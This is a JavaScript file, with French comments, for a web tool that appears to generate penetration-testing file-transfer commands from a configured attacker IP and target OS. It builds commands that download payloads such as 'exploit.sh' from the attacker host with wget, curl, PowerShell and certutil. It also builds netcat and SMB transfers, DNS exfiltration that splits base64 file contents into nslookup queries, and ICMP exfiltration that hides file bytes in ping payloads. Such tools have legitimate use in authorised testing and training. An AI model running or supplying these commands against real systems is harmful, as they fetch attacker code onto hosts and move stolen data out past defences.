// Configuration globale
let globalConfig = {
    attackerOS: 'kali',
    attackerIP: '10.10.14.1',
    listenPort: '8000',
    targetOS: 'linux',
    fileName: 'exploit.sh',
    targetPath: '/tmp/'
};

// Historique des commandes
let commandHistory = JSON.parse(localStorage.getItem('fileTransferHistory')) || [];

// Initialisation
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    loadHistory();
    updateAllCommands();
    filterMethodsByOS();
});

// Event listeners
function initializeEventListeners() {
    // Configuration - mise à jour en temps réel
    document.getElementById('attackerOS').addEventListener('change', handleConfigChange);
    document.getElementById('attackerIP').addEventListener('input', handleConfigChange);
    document.getElementById('listenPort').addEventListener('input', handleConfigChange);
    document.getElementById('targetOS').addEventListener('change', handleConfigChange);
    document.getElementById('fileName').addEventListener('input', handleConfigChange);
    document.getElementById('targetPath').addEventListener('input', handleConfigChange);
    
    // Boutons
    document.getElementById('generateCommands').addEventListener('click', generateAllCommands);
    document.getElementById('resetConfig').addEventListener('click', resetConfig);
    document.getElementById('clearHistory').addEventListener('click', clearHistory);
    document.getElementById('exportHistory').addEventListener('click', exportHistory);
    
    // Language selector
    const languageDropdown = document.getElementById('languageDropdown');
    const languageMenu = document.getElementById('languageMenu');
    
    if (languageDropdown && languageMenu) {
        languageDropdown.addEventListener('click', function(e) {
            e.stopPropagation();
            languageMenu.style.display = languageMenu.style.display === 'block' ? 'none' : 'block';
        });
        
        document.addEventListener('click', function() {
            languageMenu.style.display = 'none';
        });
    }
}

// Gestion des changements de configuration
function handleConfigChange() {
    updateGlobalConfig();
    updateAllCommands();
    filterMethodsByOS();
    updateTargetPathPlaceholder();
}

// Mise à jour de la configuration globale
function updateGlobalConfig() {
    globalConfig.attackerOS = document.getElementById('attackerOS').value;
    globalConfig.attackerIP = document.getElementById('attackerIP').value || '10.10.14.1';
    globalConfig.listenPort = document.getElementById('listenPort').value || '8000';
    globalConfig.targetOS = document.getElementById('targetOS').value;
    globalConfig.fileName = document.getElementById('fileName').value || 'exploit.sh';
    globalConfig.targetPath = document.getElementById('targetPath').value || getDefaultPath();
}

// Obtenir le chemin par défaut selon l'OS
function getDefaultPath() {
    switch(globalConfig.targetOS) {
        case 'windows':
            return 'C:\\temp\\';
        case 'macos':
            return '/tmp/';
        case 'linux':
        default:
            return '/tmp/';
    }
}

// Mettre à jour le placeholder du chemin de destination
function updateTargetPathPlaceholder() {
    const targetPathInput = document.getElementById('targetPath');
    if (targetPathInput && !targetPathInput.value) {
        targetPathInput.placeholder = getDefaultPath();
    }
}

// Filtrer les méthodes selon l'OS cible
function filterMethodsByOS() {
    const targetOS = globalConfig.targetOS;
    const methodCards = document.querySelectorAll('.method-card');
    
    methodCards.forEach(card => {
        const method = card.dataset.method;
        let shouldShow = true;
        
        // Logique de filtrage selon l'OS
        switch(method) {
            case 'smb':
                // SMB principalement pour Windows
                shouldShow = targetOS === 'windows';
                break;
            case 'http':
            case 'ftp':
            case 'netcat':
            case 'base64':
            case 'dns':
            case 'icmp':
                // Ces méthodes fonctionnent sur tous les OS
                shouldShow = true;
                break;
            case 'scp':
                // SCP/SFTP principalement pour Linux/macOS
                shouldShow = targetOS === 'linux' || targetOS === 'macos';
                break;
        }
        
        if (shouldShow) {
            card.style.display = 'block';
            card.style.animation = 'fadeInUp 0.6s ease-out';
        } else {
            card.style.display = 'none';
        }
    });
    
    // Mettre à jour le compteur de méthodes disponibles
    updateMethodsCounter();
}

// Mettre à jour le compteur de méthodes
function updateMethodsCounter() {
    const visibleMethods = document.querySelectorAll('.method-card[style*="block"]').length;
    const totalMethods = document.querySelectorAll('.method-card').length;
    
    // Ajouter un indicateur si il n'existe pas
    let counter = document.querySelector('.methods-counter');
    if (!counter) {
        counter = document.createElement('p');
        counter.className = 'methods-counter';
        const methodsSection = document.querySelector('.methods-section');
        if (methodsSection) {
            methodsSection.insertBefore(counter, methodsSection.querySelector('.method-card'));
        }
    }
    
    counter.innerHTML = `
        <span class="counter-text">
            ${visibleMethods} méthode${visibleMethods > 1 ? 's' : ''} disponible${visibleMethods > 1 ? 's' : ''} 
            pour <strong>${getOSDisplayName(globalConfig.targetOS)}</strong>
        </span>
    `;
}

// Obtenir le nom d'affichage de l'OS
function getOSDisplayName(os) {
    const osNames = {
        'linux': '🐧 Linux',
        'windows': '🪟 Windows',
        'macos': '🍎 macOS'
    };
    return osNames[os] || os;
}

// Mise à jour de toutes les commandes
function updateAllCommands() {
    const { attackerOS, attackerIP, listenPort, fileName, targetPath, targetOS } = globalConfig;
    
    // Serveurs HTTP - adaptés selon l'OS attaquant
    updateHTTPServerCommands(attackerOS, listenPort);
    
    // Téléchargements HTTP - adaptés selon l'OS cible
    updateHTTPDownloadCommands(attackerIP, listenPort, fileName, targetPath, targetOS);
    
    // Commandes FTP
    updateFTPCommands(attackerIP, listenPort, fileName, targetPath);
    
    // Commandes SCP/SFTP
    updateSCPCommands(attackerIP, fileName, targetPath);
    
    // Commandes Netcat
    updateNetcatCommands(attackerIP, listenPort, fileName);
    
    // Commandes Base64
    updateBase64Commands(fileName, targetOS);
    
    // Commandes SMB
    updateSMBCommands(attackerIP, fileName, targetOS);
    
    // Exfiltration DNS
    updateDNSCommands(attackerIP, fileName);
    
    // Exfiltration ICMP
    updateICMPCommands(attackerIP, fileName);
}

// Mise à jour des serveurs HTTP selon l'OS attaquant
function updateHTTPServerCommands(attackerOS, listenPort) {
    const commands = {
        'kali': `python3 -m http.server ${listenPort}`,
        'ubuntu': `python3 -m http.server ${listenPort}`,
        'arch': `python3 -m http.server ${listenPort}`,
        'windows': `python -m http.server ${listenPort}`,
        'macos': `python3 -m http.server ${listenPort}`
    };
    
    updateElement('httpServerPython3', commands[attackerOS] || commands['kali']);
    updateElement('httpServerPython2', `python -m SimpleHTTPServer ${listenPort}`);
    updateElement('httpServerPHP', `php -S 0.0.0.0:${listenPort}`);
    updateElement('httpServerRuby', `ruby -run -e httpd . -p ${listenPort}`);
    updateElement('httpServerNode', `npx http-server -p ${listenPort}`);
}

// Mise à jour des téléchargements HTTP selon l'OS cible
function updateHTTPDownloadCommands(attackerIP, listenPort, fileName, targetPath, targetOS) {
    const fullPath = targetPath.endsWith('/') || targetPath.endsWith('\\') ? 
                    `${targetPath}${fileName}` : `${targetPath}/${fileName}`;
    
    if (targetOS === 'windows') {
        updateElement('httpDownloadWget', `# wget non disponible sur Windows par défaut`);
        updateElement('httpDownloadCurl', `curl -o "${fileName}" "http://${attackerIP}:${listenPort}/${fileName}"`);
        updateElement('httpDownloadPowershell', `Invoke-WebRequest -Uri "http://${attackerIP}:${listenPort}/${fileName}" -OutFile "${fileName}"`);
        updateElement('httpDownloadCertutil', `certutil -urlcache -split -f "http://${attackerIP}:${listenPort}/${fileName}" "${fileName}"`);
    } else {
        updateElement('httpDownloadWget', `wget "http://${attackerIP}:${listenPort}/${fileName}" -O "${fullPath}"`);
        updateElement('httpDownloadCurl', `curl -o "${fullPath}" "http://${attackerIP}:${listenPort}/${fileName}"`);
        updateElement('httpDownloadPowershell', `# PowerShell non disponible sur ${targetOS}`);
        updateElement('httpDownloadCertutil', `# certutil non disponible sur ${targetOS}`);
    }
}

// Mise à jour des commandes FTP
function updateFTPCommands(attackerIP, listenPort, fileName, targetPath) {
    updateElement('ftpServer', `python3 -m pyftpdlib -p ${listenPort} -w`);
    updateElement('ftpDownload', `ftp ${attackerIP} ${listenPort}`);
}

// Mise à jour des commandes SCP
function updateSCPCommands(attackerIP, fileName, targetPath) {
    updateElement('scpUpload', `scp "${fileName}" user@${attackerIP}:"${targetPath}"`);
    updateElement('scpDownload', `scp user@${attackerIP}:"${targetPath}${fileName}" .`);
    updateElement('sftpConnect', `sftp user@${attackerIP}`);
}

// Mise à jour des commandes Netcat
function updateNetcatCommands(attackerIP, listenPort, fileName) {
    updateElement('ncSender', `nc -l -p ${listenPort} < "${fileName}"`);
    updateElement('ncReceiver', `nc ${attackerIP} ${listenPort} > "${fileName}"`);
}

// Mise à jour des commandes Base64
function updateBase64Commands(fileName, targetOS) {
    if (targetOS === 'windows') {
        updateElement('base64Encode', `certutil -encode "${fileName}" encoded.txt`);
        updateElement('base64Decode', `certutil -decode encoded.txt "${fileName}"`);
    } else {
        updateElement('base64Encode', `base64 -w 0 "${fileName}"`);
        updateElement('base64Decode', `echo "PASTE_BASE64_HERE" | base64 -d > "${fileName}"`);
    }
}

// Mise à jour des commandes SMB
function updateSMBCommands(attackerIP, fileName, targetOS) {
    updateElement('smbServer', `impacket-smbserver share . -smb2support`);
    updateElement('smbServerAuth', `impacket-smbserver share . -smb2support -user test -password test`);
    
    if (targetOS === 'windows') {
        updateElement('smbCopy', `copy "\\\\${attackerIP}\\share\\${fileName}" .`);
        updateElement('smbRobocopy', `robocopy "\\\\${attackerIP}\\share" . "${fileName}"`);
    }
}

// Mise à jour des commandes DNS
function updateDNSCommands(attackerIP, fileName) {
    updateElement('dnsServer', `sudo tcpdump -i any -s 0 port 53`);
    updateElement('dnsExfil', `for i in $(base64 -w 0 "${fileName}" | fold -w 32); do nslookup $i.${attackerIP}; done`);
}

// Mise à jour des commandes ICMP
function updateICMPCommands(attackerIP, fileName) {
    updateElement('icmpListen', `sudo tcpdump -i any icmp`);
    updateElement('icmpExfil', `xxd -p -c 16 "${fileName}" | while read line; do ping -c 1 -p $line ${attackerIP}; done`);
}

function updateElement(id, content) {
    const element = document.getElementById(id);
    if (element) {
        element.textContent = content;
        
        // Ajouter une classe pour indiquer que la commande a été mise à jour
        element.parentElement.classList.add('updated');
        setTimeout(() => {
            element.parentElement.classList.remove('updated');
        }, 1000);
    }
}

// Génération de toutes les commandes
function generateAllCommands() {
    updateAllCommands();
    filterMethodsByOS();
    showNotification('Toutes les commandes ont été mises à jour!', 'success');
}

// Réinitialisation de la configuration
function resetConfig() {
    document.getElementById('attackerOS').value = 'kali';
    document.getElementById('attackerIP').value = '10.10.14.1';
    document.getElementById('listenPort').value = '8000';
    document.getElementById('targetOS').value = 'linux';
    document.getElementById('fileName').value = 'exploit.sh';
    document.getElementById('targetPath').value = '/tmp/';
    
    handleConfigChange();
    showNotification('Configuration réinitialisée!', 'info');
}

// Copie de commande
function copyCommand(elementId) {
    const element = document.getElementById(elementId);
    if (!element) return;
    
    const command = element.textContent;
    
    // Vérifier si c'est un commentaire (commande non disponible)
    if (command.startsWith('#')) {
        showNotification('Cette commande n\'est pas disponible pour l\'OS sélectionné', 'warning');
        return;
    }
    
    navigator.clipboard.writeText(command).then(() => {
        // Ajouter à l'historique
        addToHistory(command);
        
        // Animation du bouton
        const copyBtn = element.parentElement.querySelector('.copy-btn');
        if (copyBtn) {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '✅';
            copyBtn.style.background = '#10b981';
            
            setTimeout(() => {
                copyBtn.textContent = originalText;
                copyBtn.style.background = '';
            }, 1000);
        }
        
        showNotification('Commande copiée!', 'success');
    }).catch(() => {
        showNotification('Erreur lors de la copie', 'error');
    });
}

// Gestion de l'historique
function addToHistory(command) {
    const historyItem = {
        command: command,
        timestamp: new Date().toLocaleString('fr-FR'),
        config: { ...globalConfig } // Sauvegarder la config utilisée
    };
    
    // Éviter les doublons récents (dernières 5 entrées)
    const recentCommands = commandHistory.slice(0, 5).map(item => item.command);
    if (!recentCommands.includes(command)) {
        commandHistory.unshift(historyItem);
        
        // Limiter à 50 entrées
        if (commandHistory.length > 50) {
            commandHistory = commandHistory.slice(0, 50);
        }
        
        localStorage.setItem('fileTransferHistory', JSON.stringify(commandHistory));
        updateHistoryDisplay();
    }
}

function loadHistory() {
    updateHistoryDisplay();
}

function updateHistoryDisplay() {
    const historyContainer = document.getElementById('commandHistory');
    if (!historyContainer) return;
    
    if (commandHistory.length === 0) {
        historyContainer.innerHTML = `
            <div class="history-empty">
                <span class="empty-icon">📝</span>
                <p>Aucune commande copiée pour le moment</p>
            </div>
        `;
        return;
    }
    
    historyContainer.innerHTML = commandHistory.map((item, index) => `
        <div class="history-item" data-index="${index}">
            <div class="history-command">${escapeHtml(item.command)}</div>
            <div class="history-meta">
                <div class="history-time">${item.timestamp}</div>
                ${item.config ? `<div class="history-config">${item.config.targetOS} → ${item.config.attackerIP}</div>` : ''}
            </div>
            <button class="copy-btn" onclick="copyFromHistory('${escapeHtml(item.command)}')">📋</button>
        </div>
    `).join('');
}

function copyFromHistory(command) {
    navigator.clipboard.writeText(command).then(() => {
        showNotification('Commande copiée depuis l\'historique!', 'success');
    });
}

function clearHistory() {
    if (confirm('Êtes-vous sûr de vouloir vider l\'historique ?')) {
        commandHistory = [];
        localStorage.removeItem('fileTransferHistory');
        updateHistoryDisplay();
        showNotification('Historique vidé!', 'success');
    }
}

function exportHistory() {
    if (commandHistory.length === 0) {
        showNotification('Aucun historique à exporter', 'warning');
        return;
    }
    
    const exportData = commandHistory.map(item => 
        `[${item.timestamp}] ${item.command}${item.config ? ` (${item.config.targetOS} → ${item.config.attackerIP})` : ''}`
    ).join('\n');
    
    const blob = new Blob([exportData], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `file-transfer-history-${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showNotification('Historique exporté!', 'success');
}

// Utilitaires
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Notifications
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    const colors = {
        success: '#10b981',
        error: '#ef4444',
        warning: '#f59e0b',
        info: '#6366f1'
    };

    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${colors[type] || colors.info};
        color: white;
        padding: 12px 24px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        font-weight: 500;
    `;

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// Styles pour les animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
    
    .command-block.updated {
        animation: highlight 1s ease-out;
    }
    
    @keyframes highlight {
        0% { background: rgba(99, 102, 241, 0.2); }
        100% { background: transparent; }
    }
    
    .methods-counter {
        color: var(--text-secondary);
        font-size: 0.875rem;
        margin-bottom: 1.5rem;
        padding: 0.75rem 1rem;
        background: var(--bg-secondary);
        border-radius: var(--border-radius);
        border-left: 4px solid var(--primary-color);
    }
    
    .counter-text strong {
        color: var(--text-primary);
    }
    
    .history-meta {
        display: flex;
        flex-direction: column;
        gap: 0.25rem;
    }
    
    .history-config {
        font-size: 0.7rem;
        color: var(--text-tertiary);
        opacity: 0.8;
    }
`;
document.head.appendChild(style); 